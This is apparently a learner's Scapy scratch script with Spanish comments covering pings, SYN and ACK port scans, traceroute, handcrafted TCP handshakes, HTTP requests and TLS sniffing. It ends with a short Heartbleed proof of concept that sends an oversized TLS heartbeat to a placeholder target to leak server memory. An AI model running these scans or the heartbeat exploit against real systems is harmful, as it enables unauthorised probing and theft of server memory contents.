#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Jun  4 20:58:14 2020

@author: root
"""



#You are sending a SYN and correctly receiving a SYN_ACK.
# At this point, you should generate and send an ACK based on the SYN_ACK that you've received,
#    and THEN finally transmit the HTTP GET request

from scapy import * 
from scapy.layers.http import HTTPRequest,HTTPResponse,HTTP,http_request
from scapy.all import load_layer
from scapy.all import sr1,IP,ICMP,TCPSession,sr,srp,srp1,send,sendp,sendpfast,RandShort
from scapy.layers.inet import TCP_client,TCP,Ether,UDP

ans,unans = sr(IP(dst="8.8.8.8")/TCP(dport=[80,443],flags="S"),timeout=1)

p=sr1(IP(dst='8.8.8.8')/ICMP())
if p:
    p.show()
    
dir(scapy.layers.http)

HTTPRequest().show()
HTTPResponse().show()

load_layer("http")
req = HTTP()/HTTPRequest(
    Accept_Encoding=b'gzip, deflate',
    Cache_Control=b'no-cache',
    Connection=b'keep-alive',
    Host=b'www.secdev.org',
    Pragma=b'no-cache'
)

a = TCP_client.tcplink(HTTP, "secdev.org", 80)
answser = a.sr1(req,timeout=3)
a.close()
with open("www.secdev.org.html", "wb") as file:
    file.write(answser.load)
    
load_layer("http")
http_request("secdev.org", "/", display=True,timeout=4)




a = TCP_client.tcplink(HTTP, "www.secdev.org", 80)
a.send(HTTPRequest())
a.recv()

########################
send(IP(dst="8.8.8.8")/ICMP()/"HelloWorld_epm")
send(IP(dst="8.8.8.8", ttl=128)/ICMP(type=0)/"HelloWorld")

i=sr1(IP(dst="8.8.8.8")/ICMP()/"HelloWorld",timeout=1)
h=sr1(IP(dst="8.8.8.8")/ICMP()/"HelloWorld",timeout=1)
i.show()
h.show()


p=sr(IP(dst="www.secdev.org")/TCP(dport=23),timeout=1)
p[0].show() # me muestra respuestas exitosas
p[1].show() #me muestra las no exitosas
ans,unans=sr(IP(dst="www.secdev.org")/TCP(dport=443),timeout=1)
ans.summary()
ans.show()
ans,unans=sr(IP(dst="www.secdev.org")/TCP(dport=[23,80,443]),timeout=1)

#scan port
ans,unans=sr(IP(dst="www.secdev.org")/TCP(sport=666,dport=[22,80,21,443], flags="S"),timeout=1)
#ACK flag
ans,unans=sr(IP(dst="www.secdev.org")/TCP(sport=888,dport=[21,22,80,443], flags="A"),timeout=1)
#puerto origen aeatorio
p=sr(IP(src="192.168.43.55", dst="www.secdev.org")/TCP(sport=RandShort(),dport=[20,21,80,443,3389], flags="S"),inter=0.5,retry=2,timeout=1)
#traceroute
traceroute(["www.google.com"], maxttl=20)
#traceroute con puerto 23
traceroute (["10.1.99.2"],dport=23,maxttl=20)
#paquete por capas
IP()
IP()/TCP()
Ether()/IP()/TCP()
IP()/TCP()/"GET / HTTP/1.1\r\n\r\n"
Ether()/IP(dst="api.tidex.com")/TCP(dport=443)/"GET /api/3/ticker/eth_btc HTTP/1.1\r\nHost: api.tidex.com\r\nConnection: close\r\n\r\n"
Ether()/IP()/IP()/UDP()

#armado de paquetes por capas
a=Ether(); a.show()
b=IP(); b.show()
c=TCP(); c.show()
d=sr(a/b/c,timeout=2)

#enviar paquete por capas
ans,unans=sr(IP(dst="api.tidex.com")/TCP(sport=RandShort(),dport=443)/"GET /api/3/ticker/eth_btc HTTP/1.1\r\nHost: api.tidex.com\r\nConnection: close\r\n\r\n")

#############HTTP
##super importante  
#https://stackoverflow.com/questions/9058052/unwanted-rst-tcp-packet-with-scapy
#iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.43.55 -j DROP
load_layer("http")
req = HTTP()/HTTPRequest(
    Accept_Encoding=b'gzip, deflate',
    Cache_Control=b'no-cache',
    Connection=b'keep-alive',
    Host=b'www.secdev.org',
    Pragma=b'no-cache'
)
a = TCP_client.tcplink(HTTP, "www.secdev.org", 80)
answser = a.sr(req,timeout=1)
a.close()

load_layer("http")
response=http_request("secdev.org", "/", display=True)


##3 way hand shake
sport=RandShort()

# SYN
ip=IP(dst='secdev.org')
SYN=TCP(sport=sport,dport=80,flags='S',seq=1000)
SYNACK=sr1(ip/SYN)
# SYN-ACK
ACK=TCP(sport=sport, dport=80, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
send(ip/ACK)
ans,unans=sr(IP(dst="secdev.org")/TCP(sport=RandShort(),dport=80)/"GET / HTTP/1.1\r\nHost: secdev.org\r\nConnection: close\r\n\r\n")

#
load_layer("tls")
packets = sniff(prn=lambda x:x.summary(), lfilter=lambda x: TLS in x)


####################################

import scapy
from scapy.layers.ssl_tls import *

import socket

target = ('target.local',443)

# create tcp socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(target)

p = TLSRecord(version="TLS_1_1")/TLSHeartBeat(length=2**14-1,data='bleed...')

s.sendall(p)
resp = s.recv(1024)
print "resp: %s"%repr(resp)
s.close()

from scapy.all import *
load_layer('tls')
